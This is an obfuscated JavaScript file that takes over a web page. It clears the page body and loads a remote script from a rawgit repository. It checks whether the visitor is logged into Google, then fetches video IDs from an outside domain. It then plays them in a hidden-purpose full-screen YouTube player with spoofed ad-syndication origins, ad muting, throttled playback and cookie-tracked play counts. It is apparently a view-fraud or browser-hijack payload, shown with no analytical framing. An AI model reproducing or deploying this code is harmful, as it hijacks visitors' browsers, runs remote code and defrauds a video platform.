var newstr = window['location']['href']['replace']('https://rawgit.com/timonty001/instalp/master/container.html#ai=', '');
document['getElementsByTagName']('body')[0]['innerHTML'] = '';
var jquery_js = document['createElement']('script');
jquery_js['setAttribute']('type', 'text/javascript'), jquery_js['setAttribute']('src', 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js'), jquery_js['async'] = !0, jquery_js['onload'] = function() {
    var _0x5b7dx3 = document['createElement']('script');
    _0x5b7dx3['setAttribute']('type', 'text/javascript'), _0x5b7dx3['setAttribute']('src', 'https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js'), document['getElementsByTagName']('body')[0]['appendChild'](_0x5b7dx3)
}, document['getElementsByTagName']('head')[0]['appendChild'](jquery_js);
var gl = -1;

function checkgoogle() {
    try {
        var _0x5b7dx3 = new Image;
        _0x5b7dx3['onload'] = function() {
            var _0x5b7dx3;
            gl = 1, _0x5b7dx3 = document, '[object Opera]' == window['opera'] && _0x5b7dx3['addEventListener']('DOMContentLoaded', f, !1)
        }, _0x5b7dx3['onerror'] = function() {
            var _0x5b7dx3;
            gl = 0, _0x5b7dx3 = document, '[object Opera]' == window['opera'] && _0x5b7dx3['addEventListener']('DOMContentLoaded', f, !1)
        }, _0x5b7dx3['src'] = 'https://accounts.google.com/CheckCookie?continue=https://www.google.com/intl/en/images/logos/accounts_logo.png'
    } catch (_0x5b7dx3) {}
}
checkgoogle();
var yt_getRandomInt = function(_0x5b7dx3, _0x5b7dx8) {
        return Math['floor'](Math['random']() * (_0x5b7dx8 - _0x5b7dx3 + 1)) + _0x5b7dx3
    },
    yt_dm_iframe = document['createElement']('div');
if (yt_dm_iframe['id'] = 'yt_if_tv_del', yt_dm_iframe['style'] = 'left:0px;top:0px;border:0px;', yt_dm_iframe['style']['width'] = '100%', yt_dm_iframe['style']['height'] = '100%', yt_dm_iframe['style']['display'] = 'block', yt_dm_iframe['style']['position'] = 'fixed', document['getElementsByTagName']('body')[0]['appendChild'](yt_dm_iframe), !window['YT']) {
    var YT = {
        loading: 0,
        loaded: 0
    }
};
if (!window['YTConfig']) {
    var YTConfig = {
        host: 'https://tpc.googlesyndication.com'
    }
};
YT['loading'] || (YT['loading'] = 1, function() {
    var _0x5b7dx3 = [];
    YT['ready'] = function(_0x5b7dx8) {
        YT['loaded'] || _0x5b7dx3['push'](_0x5b7dx8)
    }, window['onYTReady'] = function() {
        YT['loaded'] = 1;
        for (var _0x5b7dx8 = 0; _0x5b7dx8 < _0x5b7dx3['length']; _0x5b7dx8++) {
            try {
                _0x5b7dx3[_0x5b7dx8]()
            } catch (_0x5b7dx3) {}
        }
    }, YT['setConfig'] = function(_0x5b7dx3) {
        for (var _0x5b7dx8 in _0x5b7dx3) {
            _0x5b7dx3['hasOwnProperty'](_0x5b7dx8) && (YTConfig[_0x5b7dx8] = _0x5b7dx3[_0x5b7dx8])
        }
    };
    var _0x5b7dx8 = document['createElement']('script');
    _0x5b7dx8['type'] = 'text/javascript', _0x5b7dx8['id'] = 'kahretsin-script', _0x5b7dx8['src'] = 'https://rawgit.com/timonty001/instalp/master/chick.js', _0x5b7dx8['async'] = !0;
    var _0x5b7dxb = document['getElementsByTagName']('head')[0];
    _0x5b7dxb['parentNode']['insertBefore'](_0x5b7dx8, _0x5b7dxb)
}());
var yt_if_tv_del, cl_setings, onYouTubePlayerAPIReady = function() {
        playVideo()
    },
    yt_dom = 0,
    yt_st = 0,
    t_yt_track_2 = 4e4,
    id_v_yt2 = 0,
    id_v_yt = 0,
    id_v_ra = 0,
    onPlayerReady = function(_0x5b7dx3) {
        _0x5b7dx3['target']['playVideo'](), 1 != isMute ? _0x5b7dx3['target']['setPlaybackRate'](0.25) : yt_if_tv_del['mute'](), _0x5b7dx3['target']['playVideo'](), yt_if_tv_del['addEventListener']('onAdStateChange', onAdStateChange)
    },
    onVideoProgress = function(_0x5b7dx3) {
        var _0x5b7dx8 = new Date;
        _0x5b7dx8['setTime'](_0x5b7dx8['getTime']() + 1e3 * yt_getRandomInt(30, 90)), $['cookie']('YT_active', 1, {
            expires: _0x5b7dx8
        }), $['cookie'](id_v_yt2 + '_time', _0x5b7dx3['data'], {
            expires: 1
        }), $['cookie'](id_v_yt2 + '_dur', _0x5b7dx3['target']['getDuration'](), {
            expires: 1
        }), 1 != isMute && yt_if_tv_del['setPlaybackRate'](0.1)
    },
    onApiChange = function(_0x5b7dx3) {
        yt_if_tv_del['addEventListener']('onAdStateChange', onAdStateChange)
    },
    ad = 0,
    adTimout = 0,
    onAdStateChange = function(_0x5b7dx3) {
        1 == _0x5b7dx3['data'] ? (ad = 1, _0x5b7dx3['target']['mute'](), adTimout = setTimeout(function() {
            yt_if_tv_del['stopVideo'](), yt_if_tv_del['unMute'](), setTimeout(function() {
                yt_if_tv_del['playVideo'](), yt_if_tv_del['unMute']()
            }, 500)
        }, 1e4)) : (clearTimeout(adTimout), _0x5b7dx3['target']['unMute']())
    },
    isMute = 0,
    onPlayerStateChange = function(_0x5b7dx8) {
        1 != isMute && _0x5b7dx8['target']['setPlaybackRate'](2), 1 != isMute && _0x5b7dx8['target']['setPlaybackRate'](0.25), 3 != _0x5b7dx8['data'] && 1 != _0x5b7dx8['data'] || (0 == yt_dom && (yt_dom = 1), 0 == yt_st && (yt_st = 1, cur_time = Math['floor']($['cookie'](id_v_yt2 + '_time')), t = Math['floor']($['cookie'](id_v_yt2 + '_dur')) - t_yt_track_2 / 3 / 1e3, yt_if_tv_del['setPlaybackRate'](0.25), yt_if_tv_del['unMute'](), yt_if_tv_del['setVolume'](yt_getRandomInt(50, 100)), time_playback = t_yt_track_2 > 4e4 ? 4e4 : t_yt_track_2, setTimeout(function() {
            cnt = $['cookie'](id_v_yt2 + '_cnt'), void(0) == cnt && (cnt = 0), cnt = Math['floor'](cnt), cnt = 1 * cnt + 1, $['cookie'](id_v_yt2 + '_cnt', cnt, {
                expires: 1
            }), yt_if_tv_del['updateLastActiveTime'](yt_if_tv_del['getDuration']());
            new Image
        }, time_playback)))
    };

function playVideo() {
    $['get']('http://musicmixo.stream/getvideo.php' + newstr, function(_0x5b7dx3) {
        pp(_0x5b7dx3['videoId'])
    })
}

function pp(_0x5b7dx8) {
    ad = 0, host = 'https://www.youtube.com', feature = 'iv-endscreen', t = Math['round']((new Date)['getTime']() / 1e3) - 25200, _0x5b7dx8 = _0x5b7dx8, isMute = 0, yt_if_tv_del = new YT.Player('yt_if_tv_del', {
        host: host,
        height: '100%',
        width: '100%',
        videoId: _0x5b7dx8,
        playerVars: {
            docid: _0x5b7dx8,
            fs: 0,
            rel: 0,
            playsinline: !0,
            origin: 'https://tpc.googlesyndication.com',
            vq: 'tiny',
            el: 'detailpage',
            override_hl: 1
        },
        events: {
            onStateChange: onPlayerStateChange,
            onReady: onPlayerReady,
            onApiChange: onApiChange,
            onVideoProgress: onVideoProgress
        }
    })
}
